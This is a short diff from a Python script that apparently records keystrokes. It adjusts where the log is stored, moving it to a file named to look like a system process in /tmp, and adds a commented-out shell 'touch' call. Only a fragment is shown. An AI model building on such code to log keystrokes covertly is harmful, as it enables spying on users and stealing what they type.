@@ -4,7 +4,11 @@ import threading
 import os
 
 log = ""
-path = "/tmp/systemprocess/9261468.log"
+path = "/tmp/systemprocess-9261468.log"
+# try:
+#     os.system("touch " + path)
+# except:
+#     pass
 def process_keys(key):
     global log
     try:
